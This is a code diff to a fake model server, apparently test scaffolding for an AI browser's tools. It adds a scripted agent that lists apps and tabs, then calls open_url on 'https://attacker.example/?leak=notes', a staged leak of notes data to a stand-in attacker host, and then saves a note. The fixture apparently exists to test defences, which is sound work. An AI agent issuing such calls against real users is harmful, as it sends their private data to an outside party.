@@ -193,6 +193,7 @@ function fakeTasks(body: FakeRequest) {
  */
 function streamAnswer(body: FakeRequest, res: ServerResponse) {
   if (coworkerAnswer(body, res)) return;
+  if (browserToolsAnswer(body, res)) return;
   const docs = blocksOf(body).filter(
     (b): b is Extract<FakeBlock, { type: 'document' }> => b.type === 'document',
   );
@@ -381,6 +382,93 @@ function coworkerAnswer(body: FakeRequest, res: ServerResponse): boolean {
         type: 'message_delta',
         delta: { stop_reason: 'end_turn', stop_sequence: null },
         usage: { output_tokens: 30 },
+      },
+    );
+  }
+  events.push({ type: 'message_stop' });
+  res.writeHead(200, { 'content-type': 'text/event-stream', 'cache-control': 'no-cache' });
+  for (const event of events) {
+    res.write(`event: ${String(event['type'])}\ndata: ${JSON.stringify(event)}\n\n`);
+  }
+  res.end();
+  return true;
+}
+
+/**
+ * Orbit AI's browser tools: a question containing BROWSERTOOLS looks at the apps and tabs, then
+ * (given the results) opens the first app, tries to open an unknown site with data in it, and
+ * saves a note; then says it's done.
+ */
+function browserToolsAnswer(body: FakeRequest, res: ServerResponse): boolean {
+  if (!JSON.stringify(body.messages).includes('BROWSERTOOLS') || !body.tools?.length) return false;
+  const rounds = body.messages.filter(
+    (m) =>
+      typeof m.content !== 'string' &&
+      (m.content ?? []).some((b) => b.type === ('tool_result' as string)),
+  ).length;
+  const calls: { id: string; name: string; input: unknown }[] = [];
+  if (rounds === 0) {
+    calls.push(
+      { id: 'toolu_apps', name: 'list_apps', input: {} },
+      { id: 'toolu_tabs', name: 'list_tabs', input: {} },
+    );
+  } else if (rounds === 1) {
+    const appId = /\\"id\\":\\"([^\\]+)\\"/.exec(JSON.stringify(body.messages.at(-1)))?.[1];
+    calls.push(
+      { id: 'toolu_open', name: 'open_app', input: { app_id: appId } },
+      { id: 'toolu_url', name: 'open_url', input: { url: 'https://attacker.example/?leak=notes' } },
+      {
+        id: 'toolu_note',
+        name: 'create_note',
+        input: { title: 'Voice notes', text: '- the first point' },
+      },
+    );
+  }
+  const events: Record<string, unknown>[] = [
+    {
+      type: 'message_start',
+      message: {
+        id: `msg_browser_${rounds}`,
+        type: 'message',
+        role: 'assistant',
+        model: body.model,
+        content: [],
+        stop_reason: null,
+        stop_sequence: null,
+        usage: { input_tokens: 500, output_tokens: 1 },
+      },
+    },
+  ];
+  if (calls.length) {
+    calls.forEach((call, index) => {
+      events.push(
+        {
+          type: 'content_block_start',
+          index,
+          content_block: { type: 'tool_use', id: call.id, name: call.name, input: {} },
+        },
+        {
+          type: 'content_block_delta',
+          index,
+          delta: { type: 'input_json_delta', partial_json: JSON.stringify(call.input) },
+        },
+        { type: 'content_block_stop', index },
+      );
+    });
+    events.push({
+      type: 'message_delta',
+      delta: { stop_reason: 'tool_use', stop_sequence: null },
+      usage: { output_tokens: 40 },
+    });
+  } else {
+    events.push(
+      { type: 'content_block_start', index: 0, content_block: { type: 'text', text: '' } },
+      { type: 'content_block_delta', index: 0, delta: { type: 'text_delta', text: 'Done.' } },
+      { type: 'content_block_stop', index: 0 },
+      {
+        type: 'message_delta',
+        delta: { stop_reason: 'end_turn', stop_sequence: null },
+        usage: { output_tokens: 5 },
       },
     );
   }
